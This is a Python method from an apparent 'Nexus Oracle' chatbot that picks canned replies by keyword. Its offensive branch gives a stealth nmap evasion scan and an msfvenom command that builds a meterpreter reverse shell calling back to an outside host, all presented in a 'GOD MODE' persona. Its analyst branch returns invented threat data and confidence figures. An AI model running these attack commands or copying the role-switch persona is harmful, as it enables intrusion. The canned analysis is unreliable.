    async def process_chat_prompt(self, prompt: str, context: str, role: str) -> str:
        """
        Nexus Oracle freeform chat processor.
        Adapts tone and capability based on the role (hacker vs analyst).
        """
        prompt_lower = prompt.lower()
        
        if role == 'hacker' or context == 'offensive':
            if "scan" in prompt_lower or "nmap" in prompt_lower:
                return "[+] AUTONOMOUS RECON STRATEGY:\nExecute stealth SYN scan bypassing stateful inspection:\n`nmap -sS -T2 -f -D RND:10 <target>`\n[!] Proceed with extreme prejudice."
            elif "payload" in prompt_lower or "shell" in prompt_lower:
                return "[+] LETHAL PAYLOAD GENERATED:\n`msfvenom -p linux/x64/meterpreter_reverse_http LHOST=10.0.0.99 LPORT=443 -f elf > init.bin`\n[!] Inject into vulnerable kernel space."
            else:
                return "[*] GOD MODE ENGAGED. Operational parameters recognized. Awaiting distinct offensive vector."
        
        # Defensive / Analyst role
        if "threat" in prompt_lower or "status" in prompt_lower:
            return "ANALYSIS: Defcon Level 3. High-velocity port scans detected originating from ASN 41829. Recommend immediate perimeter isolation."
        elif "mitigate" in prompt_lower or "block" in prompt_lower:
            return "MITIGATION PROTOCOL: Apply targeted UFW drop rules. Deploying active honeypot to redirect traffic flow. Confidence: 94%"
        else:
            return "NEXUS STRATEGIC OVERSIGHT: Query processed. Our multi-agent systems are continuously correlating threat telemetry. How else can I assist, Analyst?"

